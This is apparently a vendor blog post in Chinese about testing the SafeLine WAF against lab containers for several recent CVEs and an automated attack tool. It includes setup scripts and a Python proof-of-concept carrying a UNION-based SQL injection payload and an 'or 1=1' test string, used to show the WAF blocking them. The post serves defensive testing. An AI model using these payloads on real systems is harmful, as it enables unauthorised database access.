#  近期0day复现到 ARTEX 自动化攻击测试，这款WAF神了  
 雷池SafeLine   2026-11-26 10:15  
  
现在部署一个网站，光靠服务器本身的安全配置其实还不够。尤其是一些对外开放的 Web 服务，一旦存在 SQL 注入、未授权访问或者其他应用层漏洞，即使服务器配置得再严格，也可能成为攻击者的入口。  
  
WAF（Web 应用防火墙）就是解决这类问题的重要防护手段之一。它部署在 Web 流量入口，对访问请求进行检测和过滤，在攻击请求到达后端应用之前，尽可能将其拦截下来。  
  
不过，WAF 到底能不能拦住漏洞利用请求，不能只看面板上有没有开启防护规则。真正有效的测试，还是要准备一个存在漏洞的环境，使用对应的 PoC 或攻击请求进行验证，再观察 WAF 的拦截结果和日志记录。  
  
这次我们就围绕雷池社区版（SafeLine WAF）做一次实际测试。  
  
整个过程分为几个部分：先在服务器上部署雷池，随后搭建近期公开的漏洞靶场，分别测试 CVE-2026-132165、CVE-2026-77378 和 Git LFS CVE-2026-105802。最后再使用最近比较受关注的 ARTEX 进行自动化攻击测试，看看面对真实的 SQL 注入请求，雷池能否及时识别并阻断。  
  
这里不只是单纯安装一个 WAF，而是尽量把漏洞环境、攻击请求、反向代理和防护日志串起来。这样测试完之后，我们能够看到攻击请求是如何进入防护系统的，又是在哪个环节被拦截的。  
## 一、雷池 WAF 安装部署  
  
在搭建环境之前，先说一下服务器的网络问题。  
  
雷池安装过程中需要下载相关组件和镜像，如果服务器访问外网不稳定，很容易在安装或者拉取镜像时卡住。因此，环境搭建时建议优先使用网络条件比较好的国外服务器；使用国内服务器的话，建议提前配置好网络访问环境。  
  
![image-20261120234322165](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1E8ULvdwpfMdvJ8rvF2T7MU4EuRm9j2R8zAMdDQvsNhTRhn3vEd03qBOB8P41HA4TSmT6Xp57XCfhia2qd4KTSvwncv7jzEG3icAnYoBf5UnQ/640?wx_fmt=other&from=appmsg "")  
### 1. 更新系统  
  
准备好一台 Linux 服务器，先更新系统软件包：  
```
apt update -y && apt upgrade
```  
### 2. 安装雷池  
  
系统更新完成后，执行雷池社区版的安装命令：  
```
bash -c "$(curl -fsSLk https://waf-ce.chaitin.cn/release/latest/manager.sh)"
```  
  
等待安装程序执行即可。如果安装过程中没有正常完成，可以按 CTRL+C  
 结束当前安装程序，再重新执行一次安装命令。  
  
![image-20261121000053868](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1E8ULvdwpfN4b7Vib15cI1ianGKZlzEib1q3mLTZic8ovpTnKubGNcSVXzMLVsCH5zn9sRMkpFuzLreLqdyepaY8hVEnlaKSkdEjG1FHfZicmSlE/640?wx_fmt=other&from=appmsg "")  
  
安装完成后，终端会显示对应的登录信息。  
  
此时访问服务器公网 IP 的 9443 端口，输入终端给出的账号和密码，就可以进入雷池管理界面。  
  
![image-20261121002920679](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1E8ULvdwpfMBIfohqZOa75V95FXm2z7kHJ1ESyBsSwT2UNnyIPOLjqObykiciakqjnrahmhKibX5nJW1tG24Z7aQuzHJFRk1BiawyIXrZR3vj4U/640?wx_fmt=other&from=appmsg "")  
  
成功登录后就能看到雷池的管理首页，至此基础部署已经完成。  
  
![image-20261121003014867](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1E8ULvdwpfNCYbYEcRCGZCMaa6aclH2us929ZGWbiboBMbbhcYpLvTaOBNDic6jribUKeWdaVic3xgZHmicfRvjh78lOjseBibsU07gibwYAr9ksIE/640?wx_fmt=other&from=appmsg "")  
  
接下来开始搭建漏洞环境，把实际的攻击请求接入雷池进行测试。  
## 二、近期 0day 漏洞 CVE-2026-132165 复现与防护测试  
  
先来测试 CVE-2026-132165。  
  
这次使用的是 GitHub 上的公开靶场项目，通过 Docker 搭建漏洞环境，再运行项目提供的 PoC 验证漏洞是否存在。完成验证后，将站点接入雷池，通过反向代理重新发起测试，观察防护效果。  
### 1. 搭建漏洞靶场  
  
首先克隆项目：  
```
git clone https://github.com/abraxas/drupal-install-takeover.gitcd drupal-install-takeover
```  
  
![image-20261121005554796](https://mmbiz.qpic.cn/mmbiz_jpg/1E8ULvdwpfM7x1OOC2s2FicBILr0F0v2qBIHDCxFR6K0KHMxUwJtfI18tBFsjVYrNGPksvl7Ie8ounCKqIsvT8iaj7UJXRY95pgVXkb2WV6fo/640?wx_fmt=other&from=appmsg "")  
  
进入项目中的 lab  
 目录，设置 Docker Compose 项目名称，然后启动环境：  
```
cd labexport COMPOSE_PROJECT_NAME=cve-2026-132165docker compose up --build -d
```  
  
正常情况下，Docker 会自动构建所需镜像并启动对应容器。  
### 2. 解决 Docker 镜像拉取问题  
  
如果执行构建命令时发现 Docker 无法正常拉取镜像，可以先检查服务器的网络连接情况。  
  
![image-20261121010124031](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1E8ULvdwpfNU4D2UbWSEd9oaodwUV4FJbVP6pkzmG4hcg54XPjMjianuser9V3thaZkXTebhsF9lTH7hsR9bzkLk1fCSOibIMiaxnHmLFX1xdw/640?wx_fmt=other&from=appmsg "")  
  
这里通过配置 Docker 镜像加速来解决拉取失败的问题。  
  
先创建 Docker 配置目录，并备份原有配置文件：  
```
mkdir -p /etc/docker[ ! -f /etc/docker/daemon.json ] || \cp -a /etc/docker/daemon.json /etc/docker/daemon.json.bak
```  
  
接下来修改 Docker 的 daemon.json，加入镜像加速地址：  
```
python3 - <<'PY'import jsonfrom pathlib import Pathp = Path("/etc/docker/daemon.json")if p.exists():    config = json.loads(p.read_text())else:    config = {}mirrors = config.get("registry-mirrors", [])mirror = "https://docker.m.daocloud.io"if mirror notin mirrors:    mirrors.insert(0, mirror)config["registry-mirrors"] = mirrorsp.write_text(json.dumps(config, indent=2) + "\n")print(p.read_text())PY
```  
  
配置完成后，重新加载 systemd 并重启 Docker：  
```
systemctl daemon-reloadsystemctl restart docker
```  
  
重新执行镜像构建操作即可。  
  
![image-20261121010148032](https://mmbiz.qpic.cn/mmbiz_jpg/1E8ULvdwpfNpIiaNId9LtS4hXy42mvusYtoMu91PNlP6PcqtrRTX5CTQLPTLN90kWDE9voloia70S62EUU3IWGJh42BnwfDMnh9icHffHaXqNc/640?wx_fmt=other&from=appmsg "")  
### 3. 运行 PoC 验证漏洞  
  
靶场启动完成后，运行项目提供的 PoC。  
  
如果输出结果中出现 SUCCESS  
，就说明本次漏洞验证成功。  
  
![image-20261121011018400](https://mmbiz.qpic.cn/mmbiz_jpg/1E8ULvdwpfOMEcFibn6t0IJlhiahr8riastfNwKJdjtSZno8sDEwUPYctWYEmnTOkd1eC0A2JwdibzejWF5YdxzI8JAkCy67VhowZSoAZNicYtg8/640?wx_fmt=other&from=appmsg "")  
  
这里有两个字段需要特别留意：  
- takeover=yes  
：表示漏洞版本中的测试账户已经被替换，账户接管验证成功。  
  
- rce=no  
：表示本次验证没有执行系统命令，也没有建立反弹 Shell。  
  
这两个结果不能混为一谈。项目作者明确说明，这个靶场验证的是管理员账户接管，并不是完整的远程代码执行（RCE）。  
  
![image-20261121015721175](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1E8ULvdwpfOqltQO3VjBDBvdkhMfqsoSAOHOkHlEcTYNzm5LsnnDFeorxXxB3bJmJ27zsutEqaJ4kGTevSPdIeqfFHGBLAYAH41olWsgic6M/640?wx_fmt=other&from=appmsg "")  
### 4. 安装 Drupal 站点  
  
接下来需要完成靶场中的站点安装。  
  
![image-20261121020211017](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1E8ULvdwpfPwFUAfcCQTvXBvrnmU5vRtqiaqaUxNzTiakcicicCsr2a9VHzVZAOvicyHzlMKZyVFSHbpgIxduruCbO1guLRwY0Bbj8ibJkCToyn2s/640?wx_fmt=other&from=appmsg "")  
  
按照页面提示继续操作，一路点击下一步，完成站点初始化。  
  
![image-20261121020403831](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1E8ULvdwpfMM0VHf4EXltMPkWzfs5ibVbOzpOjWCVcvb4gKanVJicuXAp3Jxk4rs77ETU1PQnMiaptibFkZJ2QFskiaGR7VwCK4apZV4czoV6uU8/640?wx_fmt=other&from=appmsg "")  
  
站点安装完成后，接下来需要调整 PoC 中的目标地址，将原来的地址修改为经过反向代理之后使用的域名。  
  
![image-20261121015854634](https://mmbiz.qpic.cn/mmbiz_jpg/1E8ULvdwpfPkkVicuHTsWxvtZVQvJAJeXxgD0NYziatBbSXvib8U84rwjrNNhr17p246COmLx0KZK0QjIe8ib5TD5eBRVK5rXbKicXibRnL9MXq2M/640?wx_fmt=other&from=appmsg "")  
  
配置完成后，再次使用 PoC 发起请求。  
  
![image-20261121015929136](https://mmbiz.qpic.cn/mmbiz_jpg/1E8ULvdwpfOcPiczmAKLVaecsTv4fjAAFs0Emovicltet6v3ZcsMiaia7xiaI1ZcGjBABkk8PiaGPJskJ2E4fEM7QqOEpuFocS5TS9N4bJptEfiaT4/640?wx_fmt=other&from=appmsg "")  
  
从本次测试结果来看，攻击请求已经被雷池成功拦截。至此，CVE-2026-132165 的靶场搭建、漏洞验证以及 WAF 防护测试就完成了。  
## 三、CVE-2026-77378：ListFormatHelper SQL 注入  
  
接下来测试另一个漏洞：CVE-2026-77378。  
  
这个环境主要用于验证 ListFormatHelper 相关的 SQL 注入问题。与前面的 Drupal 靶场不同，这次项目中准备了漏洞版本和修复版本，可以同时启动两个容器进行对照测试。  
  
这样做的好处是，除了验证漏洞版本是否存在问题，还能检查修复版本在相同测试条件下的表现。  
### 1. 下载项目  
  
先回到用户主目录，克隆对应的 GitHub 项目：  
```
cd ~git clone https://github.com/googlesky/CVE-2026-77378.gitcd CVE-2026-77378
```  
  
![image-20261121123225603](https://mmbiz.qpic.cn/mmbiz_jpg/1E8ULvdwpfOffaiabT1DzF6J4MibfP2HwLzvN2mFz2GxGNKAzMdnib9dRVT9cD0X3c70CUkVgtMT3Gs7DGntQMbOicpPVqEyflPXZHoS4TFt0Uk/640?wx_fmt=other&from=appmsg "")  
### 2. 创建 Docker 启动脚本  
  
为了方便管理两个版本的漏洞环境，这里创建一个 run-lab-docker.sh  
 脚本。  
  
脚本主要负责三件事情：构建漏洞版本和修复版本镜像、启动两个测试容器，以及运行 PoC 对两个环境进行全量测试。  
  
创建脚本：  
```
cat > run-lab-docker.sh <<'EOF'#!/usr/bin/env bashset -euo pipefailNET="cve77378lab"HERE="$(cd "$(dirname "$0")" && pwd)"build() {    echo"[+] Building vulnerable helper"    docker build -f "$HERE/lab/lab.Dockerfile" \        --target vuln \        -t cve-2026-77378:vuln \        "$HERE/lab"    echo"[+] Building fixed helper"    docker build -f "$HERE/lab/lab.Dockerfile" \        --target fixed \        -t cve-2026-77378:fixed \        "$HERE/lab"    echo"[+] Building PoC runner"    docker build -t cve-2026-77378-poc:local"$HERE/poc"}up() {    docker network inspect "$NET" >/dev/null 2>&1 || \        docker network create "$NET" >/dev/null    for side in vuln fixed; do        docker rm -f "bolt-$side" >/dev/null 2>&1 || true        docker run -d \            --name "bolt-$side" \            --network "$NET" \            --cpus 2 \            --memory 1g \            "cve-2026-77378:$side" >/dev/null        echo"[+] Started bolt-$side"    done}sweep() {    mkdir -p "$HERE/evidence"    for mode in check exploit probe mitigation; do        for side in vuln fixed; do            echo            echo"========== $mode / bolt-$side =========="            logfile="$HERE/evidence/${mode}-${side}-docker-run.txt"            if docker run --rm \                --network "$NET" \                --cpus 1 \                --memory 256m \                cve-2026-77378-poc:local \                "$mode""--host=bolt-$side" \                > "$logfile" 2>&1; then                rc=0            else                rc=$?            fi            cat"$logfile"            echo"[+] Exit code: $rc"            echo"[+] Saved: $logfile"        done    done}down() {    docker rm -f bolt-vuln bolt-fixed 2>/dev/null || true    docker network rm"$NET" 2>/dev/null || true    echo"[+] Lab stopped and network removed"}case"${1:-}"in    build) build ;;    up) up ;;    sweep) sweep ;;    down) down ;;    *)        echo"Usage: $0 {build|up|sweep|down}"        exit 2        ;;esacEOFchmod +x run-lab-docker.sh
```  
### 3. 构建镜像  
  
脚本创建完成后，执行构建命令：  
```
./run-lab-docker.sh build
```  
  
这里会依次构建三个镜像，分别是漏洞版本、修复版本以及 PoC 运行环境。  
  
![image-20261121123340836](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1E8ULvdwpfNOeVg3fBLvwrBZnKgpE2fpicC7vCkydrprrRRmAZTBq0ZPy6HpGCelK8wNqJkFWBL2n62icj2ibBkGrUgoicnZQewfgK3f1ibknLRY/640?wx_fmt=other&from=appmsg "")  
### 4. 启动漏洞环境  
  
镜像构建完成后，启动两个容器：  
```
root@VM-0-12-ubuntu:~/CVE-2026-77378# lsCITATION.cff  LICENSE  Makefile  README.md  SECURITY.md  evidence  exploit  lab  poc  run-lab-docker.sh  run-lab.shroot@VM-0-12-ubuntu:~/CVE-2026-77378# docker images | grep cve-2026-77378cve-2026-77378-poc:local                                                   7b15f92d01e5       74.1MB         18.1MBcve-2026-77378:fixed                                                       7fa19da832f8        793MB          193MBcve-2026-77378:vuln                                                        317b203f53c3        793MB          193MBroot@VM-0-12-ubuntu:~/CVE-2026-77378# ./run-lab-docker.sh up[+] Started bolt-vuln[+] Started bolt-fixedroot@VM-0-12-ubuntu:~/CVE-2026-77378# docker ps --filter "name=bolt-"CONTAINER ID   IMAGE                  COMMAND                 CREATED         STATUS         PORTS      NAMESa157e4a19661   cve-2026-77378:fixed   "python3 /service.py"   9 seconds ago   Up 8 seconds   8080/tcp   bolt-fixedd83a9be7db01   cve-2026-77378:vuln    "python3 /service.py"   9 seconds ago   Up 9 seconds   8080/tcp   bolt-vulnroot@VM-0-12-ubuntu:~/CVE-2026-77378#
```  
  
可以看到，两个容器已经正常启动。  
  
其中 bolt-vuln  
 对应漏洞版本，bolt-fixed  
 对应修复版本，两个容器都监听在 8080 端口。  
  
![image-20261121131153223](https://mmbiz.qpic.cn/mmbiz_jpg/1E8ULvdwpfNgiaVVzPKS5uSzECyQjbaoEoWIXalw1uTHeUE1eo4ibCSDqoQCzHyjTo2RT0XLUOlLzAwzGDiaGicNnE275RhXk1riaFMicZicbI8u74/640?wx_fmt=other&from=appmsg "")  
### 5. 执行全量漏洞测试  
  
环境启动之后，运行脚本中的 sweep  
 模式：  
```
./run-lab-docker.sh sweep
```  
  
脚本会分别对漏洞版本和修复版本执行 check  
、exploit  
、probe  
 和 mitigation  
 四组测试，并把每次运行的结果保存到 evidence  
 目录。  
  
![image-20261121132532937](https://mmbiz.qpic.cn/mmbiz_jpg/1E8ULvdwpfP037OMEpHYbeEr5Kbj9AtT6AZk5ibajb3CHmkIkySjibNeZjnslAuzpwcSPxRmjlpZ5nQUUZGqzwuwT31aIQpjOLLe7MOKseulk/640?wx_fmt=other&from=appmsg "")  
  
从测试结果可以对比两个版本的表现。接下来将漏洞环境接入雷池，重点观察 WAF 对 SQL 注入请求的识别和拦截情况。  
### 6. 将漏洞环境接入雷池  
  
首先查看两个容器的 IP 地址：  
```
root@VM-0-12-ubuntu:~/CVE-2026-77378# docker ps --filter "name=bolt-"CONTAINER ID   IMAGE                  COMMAND                 CREATED         STATUS         PORTS      NAMESa157e4a19661   cve-2026-77378:fixed   "python3 /service.py"   9 seconds ago   Up 8 seconds   8080/tcp   bolt-fixedd83a9be7db01   cve-2026-77378:vuln    "python3 /service.py"   9 seconds ago   Up 9 seconds   8080/tcp   bolt-vulnroot@VM-0-12-ubuntu:~/CVE-2026-77378# for name in bolt-vuln bolt-fixed; do    echo "===== $name ====="    docker inspect -f \    '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' \    "$name"done===== bolt-vuln =====172.19.0.2===== bolt-fixed =====172.19.0.3
```  
  
记录两个容器的 IP 地址，后续配置反向代理时会用到。  
  
接下来进入雷池管理面板，添加对应的应用。  
  
这里有一点需要注意：如果之前安装雷池时已经创建过测试应用，需要先删除原来的应用，避免它占用我们准备使用的 80 端口。  
  
![image-20261121131336552](https://mmbiz.qpic.cn/mmbiz_jpg/1E8ULvdwpfMwgmoGTibD5EziabiaWGHwrcoETvziaaDaLxOgIAgs0kGic1fUWKJLsOMXgJiciax6NCrFY0Xk6ibagMh8nDwHrM5EIP9SqIpay5kggCs/640?wx_fmt=other&from=appmsg "")  
  
应用添加完成后，就可以通过雷池代理访问后端漏洞环境。  
### 7. 测试 SQL 注入请求  
  
接下来进行一次简单的 SQL 注入测试，使用：  
```
or 1=1
```  
  
观察请求经过雷池之后的处理结果。  
  
![image-20261121133058500](https://mmbiz.qpic.cn/mmbiz_jpg/1E8ULvdwpfNGQkic3kYkKicTPFaEV5gPoAylVL3dmKvCxgvF6SOsqdP1ASQko3CQCsZu7Ho6TibZnocath0RqzLibKmyLkV2RBtpYrdg32cicWm4/640?wx_fmt=other&from=appmsg "")  
  
由于现在访问的是经过反向代理的环境，目标地址已经发生变化，因此还需要修改 PoC 中的目标 IP 或域名。  
  
下面是调整后的完整 PoC：  
```
#!/usr/bin/env python3import argparseimport http.clientimport jsonimport sysparser = argparse.ArgumentParser(    description="CVE-2026-77378 WAF validation")parser.add_argument("--host", default="bolt-vuln")parser.add_argument("--port", type=int, default=8080)parser.add_argument("--path", default="/select")parser.add_argument("--header-host", default=None)parser.add_argument("--timeout", type=int, default=20)parser.add_argument("--https", action="store_true")args = parser.parse_args()# 实验室 SQL 注入验证载荷payload = 'pages") UNION SELECT id, name FROM bolt_users-- 'headers = {    "Content-Type": "application/json",    "Accept": "application/json",    "User-Agent": "CVE-2026-77378-Lab"}if args.header_host:    headers["Host"] = args.header_hostconnection_class = (    http.client.HTTPSConnection    if args.https    else http.client.HTTPConnection)conn = connection_class(    args.host,    args.port,    timeout=args.timeout)print("[*] Target: %s:%s" % (args.host, args.port))print("[*] Path: %s" % args.path)print("[*] Testing CVE-2026-77378...")try:    conn.request(        "POST",        args.path,        body=json.dumps({"contentType": payload}),        headers=headers    )    response = conn.getresponse()    body = response.read()    print("[*] HTTP Status: %d %s" % (        response.status,        response.reason    ))    if response.status in (403, 406, 429):        print("[+] Request rejected at HTTP layer.")        print("[+] Check SafeLine attack logs to confirm WAF blocking.")        sys.exit(3)    try:        data = json.loads(body orb"{}")    except (ValueError, UnicodeDecodeError):        print("[-] Response is not JSON:")        print(body[:500].decode("utf-8", errors="replace"))        sys.exit(2)    if data.get("injected"):        print("[!] Payload reached the raw SQL construction.")        print("[!] SQL: %s" % (data.get("query") or"")[:300])        print("[!] Vulnerable behavior detected.")        sys.exit(1)    print("[+] Input was not interpolated into SQL.")    print("[+] Target behaves as fixed or safely handled.")except Exception as e:    print("[-] Connection failed: %s" % e)    sys.exit(2)finally:    conn.close()
```  
  
![image-20261121134405132](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1E8ULvdwpfPeuNibW4zEic1RrkMUeWicOuuHJnS1NhKIGHSa1DtDuSVZvXy5oVXdDRRoQaau7c5ZP07HdqpjRY8NSBmwsF5LhqxPMnYlxVXLag/640?wx_fmt=other&from=appmsg "")  
  
从本次测试结果来看，请求已经被成功拦截。再结合雷池后台的攻击日志，就可以进一步确认对应的拦截记录。  
  
至此，CVE-2026-77378 的漏洞环境搭建、漏洞版本与修复版本对照，以及接入雷池后的防护测试都已经完成。  
## 四、Git LFS CVE-2026-105802 测试  
  
前面测试了 Drupal 账户接管和 ListFormatHelper SQL 注入，接下来再看一个 Git LFS 相关漏洞：CVE-2026-105802。  
  
这个环境的搭建过程这里就不再展开了，可以根据对应 GitHub 项目的说明完成靶场部署，再按照前面的思路，将漏洞环境接入雷池。  
  
环境准备完成后，运行对应 PoC，观察请求返回结果。  
  
![image-20261121160153459](https://mmbiz.qpic.cn/mmbiz_jpg/1E8ULvdwpfNJiclEhdRtQYsWazAc64JJXPPxicibaOmJLvWicKKicc2kTDONwmYiaAtHgex4g4mFSGiaYBdGRpmjX2WMORzsd224rficiaAlzic2icrqX0/640?wx_fmt=other&from=appmsg "")  
  
从截图可以看到，本次请求返回了 HTTP 403 状态码，说明请求已经在 HTTP 层被拒绝。结合雷池后台的攻击日志，可以进一步确认此次拦截是否由 WAF 规则触发。  
  
这也是测试 WAF 时比较重要的一点：不能只看 PoC 有没有报错，还要结合 HTTP 状态码和后台日志判断请求究竟被哪一层拦截。  
## 五、使用 ARTEX 进行自动化攻击测试  
  
前面几次测试主要是通过手动运行 PoC，验证具体漏洞请求能否被雷池识别。  
  
最后换一种方式，使用最近比较受关注的 ARTEX 进行测试，看看自动化攻击工具面对 SQL 注入环境时，能否成功利用漏洞，以及雷池能否拦截它发起的请求。  
  
本次仍然使用前面的 CVE-2026-77378 SQL 注入测试场景。  
  
![image-20261123002303343](https://mmbiz.qpic.cn/mmbiz_jpg/1E8ULvdwpfMIjSIonOKFlxvF3rzavFUmlhsw0aW62nC0Ab55icGTGPbpmUKw2fywuv0lLlRtIzFFSmAxOtZ0sxExSfxnOt9mVwjTsOhyicMVQ/640?wx_fmt=other&from=appmsg "")  
### 1. 准备 SQL 注入测试环境  
  
首先准备一个用于测试的 SQL 注入环境，这里通过 AI 辅助生成一个简单的 SQL 注入靶场，作为 ARTEX 的测试目标。  
  
![image-20261123004951631](https://mmbiz.qpic.cn/mmbiz_jpg/1E8ULvdwpfNAOH97Zl4TRnGwoVv5B5VvjUvLvZibMFkIzz4Dxh7grB1gEjxYmXKJ6Qhbw4fM55ZooXzUTARctyBhJS66G8uic0ibMLgBfjEgW0/640?wx_fmt=other&from=appmsg "")  
  
![image-20261123005003482](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1E8ULvdwpfM62dJAo3GdhvtjPElZyUpezcw0HQP3cpwyHan2GVOtN9FJLckKGpPFNT4Cp1Hmm13vmagbkjibhPG4YLoI3C5wpgY40PIUh5p0/640?wx_fmt=other&from=appmsg "")  
  
环境搭建完成后，检查靶场的搜索页面，可以看到这里存在 SQL 注入问题。  
  
![image-20261123005143795](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1E8ULvdwpfPldAQE1vKfvNPyibmtrp8urO4nfKouwZCVZaJddp0xv4ZKicribvbw5uSSnicicibC07grIvvgpwewPUgnPtwp71OvfoKkGyIUAZNOc/640?wx_fmt=other&from=appmsg "")  
  
使用简单的 or 1=1  
 进行测试，可以观察到对应的注入现象。  
  
![image-20261123005135580](https://mmbiz.qpic.cn/mmbiz_jpg/1E8ULvdwpfOSc6vBmt2X0syWp5IL7NJ8cHYwH6ol5FdNsZyT80lwnmbtQjMoTmgIKlXkqHnycQia9c7tVmhSRvjSJW0CGebA6af4eE0faDEI/640?wx_fmt=other&from=appmsg "")  
### 2. ARTEX 自动化测试  
  
接下来让 ARTEX 对这个测试环境进行攻击验证。  
  
这次主要观察 ARTEX 能否识别搜索页面中的 SQL 注入入口，以及在实际发起攻击请求时，雷池能否及时进行拦截。  
  
最终测试结果显示，雷池 WAF 成功拦截了 ARTEX 发起的攻击请求。  
  
本轮测试结果：  
  
**胜方：雷池 WAF。**  
  
![image-20261123005723150](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1E8ULvdwpfNibL23p2vOOkBkXrTsDbjSYYMdeubct51dNOODxUyoHYzmKltKic7hpdcMqeWbkAc9xuqIVtHg2HgxG8F8vpHgXHLEdOO0dZoUM/640?wx_fmt=other&from=appmsg "")  
### 3. 查看雷池后台拦截记录  
  
攻击测试完成后，再进入雷池管理面板查看对应的防护数据。  
  
![image-20261123010024638](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1E8ULvdwpfNo3Vwc6uzQFZSXQOgKBwVbaIBEiciaahhXuckflicMZvqk7zmibtTfWgmQ7z8nL5AxFia1iacnCWcSwjNqicPtvnBUS2K0jVF7Dkzaic0/640?wx_fmt=other&from=appmsg "")  
  
可以看到后台已经记录了相应的拦截信息。  
  
![image-20261123010941819](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1E8ULvdwpfOxpJuM1eIZ2OSVZluicbs7WCUjOTRKWqQiaT5nwKibE96HzuFBbweRaziajmL3yF2y6pG1hYUwGiaWM00NBhD1UJGRkvMR2sB59OSI/640?wx_fmt=other&from=appmsg "")  
  
从这次测试来看，无论是手动构造 SQL 注入请求，还是使用 ARTEX 进行自动化攻击测试，雷池都成功拦截了本次实验中的攻击请求。  
  
当然，WAF 拦截成功并不意味着应用本身的漏洞就已经修复。对于真实业务环境，还是应该及时修补漏洞、更新组件，并结合 WAF 防护规则进行多层防御。  
## 六、最后  
  
这次主要围绕雷池社区版做了几组实际测试，从环境部署、漏洞靶场搭建，到 PoC 验证、反向代理接入，再到 ARTEX 自动化攻击测试，基本走完了一遍 Web 应用防护的测试流程。  
  
相比单纯在管理面板里开启防护规则，我更建议大家准备一个自己的测试环境，找几个有代表性的漏洞，亲自发起请求，再到后台查看拦截日志。这样不仅能知道请求有没有被拦截，也能更直观地了解 WAF 的检测和防护过程。  
  
如果在安装、配置或者规则测试过程中遇到问题，也欢迎加入雷池官方交流群交流，或者直接查阅官方文档。  
  
雷池官网：https://rivers.chaitin.cn/s/76bf100c9662  
  
专业版试用申请：https://rivers.chaitin.cn/s/eca164650efa  
  
**官方交流群：**  
  
![04f17c96f5e8a67dd6a791eef190d732](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1E8ULvdwpfN3RECichrY4fXtAKzcJ5Jv53F6t6Fw2Fsm6n7saKGpKgdVlh2ZSbDWhvhGcb32kHOuhhsgCRdQHwHk7WxNPKMqOp9BgbTOX96Y/640?wx_fmt=other&from=appmsg "")  
  
